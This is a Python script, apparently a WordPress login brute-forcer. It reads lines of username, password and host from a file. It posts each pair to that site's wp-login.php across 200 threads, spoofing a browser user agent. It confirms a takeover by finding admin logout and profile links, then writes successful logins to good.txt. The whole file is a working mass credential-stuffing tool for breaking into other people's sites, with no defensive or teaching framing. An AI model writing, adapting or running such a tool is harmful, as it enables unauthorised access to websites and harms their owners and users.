# coding=utf-8
import requests
import time
import os
from threading import Thread, current_thread
from queue import Queue

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'ru-ru,ru;q=0.8,en-us;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'DNT': '1'
}

source_file = "source.txt"
#theard_count = int(input('Number of threads: '))
theard_count = 200 
def brut(string):
    t = string.split()
    payload = {
        'log':t[0],
        'pwd':t[1],
        #'wp-submit': 'Log+In',
        #'rememberme': 'forever',
        'redirect_to': 'http://'+t[2]+'/wp-admin',
        'testcookie': '1'
    }
    url = 'http://'+t[2]+'/wp-login.php'
    s = requests.Session()
    try:    
        s.post(url, data=payload, headers=headers, timeout = 10)
    except Exception:
        print('ERROR')
        return False
#---------------------------------------------------------------------------------------
    '''if s.text.find('action=lostpassword')>0:action=logout
        return False
    else:'''
    response = s.get('http://'+t[2]+'/wp-admin', headers=headers, timeout = 10)
    #if response.status_code == 200:
    if response.text.find('action=logout')>0 and response.text.find('profile.php')>0:
    #if response.text.find('action=lostpassword')<0:
        return True
    else:
        return False
    #else:
        #return False
#action=lostpassword
def run(queue, result_queue):
    status = False
    # Цикл продолжается пока очередь задач не станет пустой
    while not queue.empty():
        # получаем первую задачу из очереди
        host = queue.get_nowait()
        print('Checking in thread {}'.format(current_thread()))
        print(host)
	# проверяем URL
        try:
            status = brut(host)
        except Exception:
            print('Error in thread')
            #status = False
        # сохраняем результат для дальнейшей обработки
        result_queue.put_nowait((status, host))
        # сообщаем о выполнении полученной задачи
        queue.task_done()
        if status == True:
            print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
            open('good.txt', 'a+').write(host + '\n')
        else:
            pass
        print('Finished in thread {}. Result={}'.format(current_thread(), status))
    print('{} closing'.format(current_thread()))

# MAIN
def main():
    start_time = time.time()

    # Для получения задач и выдачи результата используем очереди
    queue = Queue()
    result_queue = Queue()

    #fr_success = os.path.join(domain_temp, "good.txt")
    #fr_errors  = os.path.join(domain_temp, "error.txt")

    # Сначала загружаем все URL из файла в очередь задач
    with open(source_file) as f:
        for line in f:
            queue.put(line.strip())

    # Затем запускаем необходимое количество потоков
    for i in range(theard_count):
        thread = Thread(target=run, args=(queue, result_queue))
        thread.daemon = True
        thread.start()

    # И ждем, когда задачи будут выполнены    
    queue.join()

    print(time.time() - start_time)

if __name__ == '__main__':
    main()
